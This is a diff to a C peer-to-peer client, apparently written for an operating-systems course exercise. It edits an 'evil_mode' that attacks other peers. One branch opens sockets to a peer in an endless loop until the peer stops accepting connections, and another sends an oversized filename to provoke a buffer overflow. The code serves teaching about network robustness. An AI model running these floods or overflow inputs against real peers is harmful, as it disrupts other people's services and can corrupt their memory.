@@ -541,9 +541,9 @@ static void task_download(task_t *t, task_t *tracker_task)
 		   && t->peer_list->port == listen_port)
 		goto try_again;
 	
-	// Exercise 3 - Try a Denial of Service attack
+	// Exercise 3 - Try a peer overrun attack
 	if (evil_mode == 2) {
-		message("* Try attacking %s:%d with '%s' DOS\n", 
+		message("* Try attacking %s:%d with '%s' peer denial of service\n", 
 			inet_ntoa(t->peer_list->addr), 
 			t->peer_list->port, t->filename);
 		// try once
@@ -556,7 +556,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 		while (1) {
 			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
 			if (t->peer_fd == -1) {
-				error("* Successful DOS attack - user can no longer connect to peer any more: %s\n"
+				error("* Successful peer overrun - user can no longer connect to peer any more: %s\n"
 					, strerror(errno));
 				goto try_again;
 			}
@@ -578,8 +578,8 @@ static void task_download(task_t *t, task_t *tracker_task)
 	if (evil_mode == 1) {
 		message("* Try attacking with filename buffer overflow\n");
 		// create buffer overflow input
-		char overflow[FILENAMESIZ * 2];
-		memset(overflow, 1, FILENAMESIZ*2);
+		char overflow[FILENAMESIZ * 3];
+		memset(overflow, 1, FILENAMESIZ*3);
 
 		// send input
 		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", overflow);
@@ -767,6 +767,7 @@ static void task_upload(task_t *t)
 				goto exit;
 			}
 		}
+	//End 3 Code	
 	} else {
 		// Now, read file from disk and write it to the requesting peer.
 		while (1) {
@@ -884,6 +885,7 @@ int main(int argc, char *argv[])
 	register_files(tracker_task, myalias);
 	prev_task = NULL;
 
+	//WHAT DOES THIS CODE EVEN DO VIR? Im confused lol
 	// Exercise 3 - Begin downloader attacks in concurrent processes
 	if (evil_mode == 1 || evil_mode == 2) 
 	{
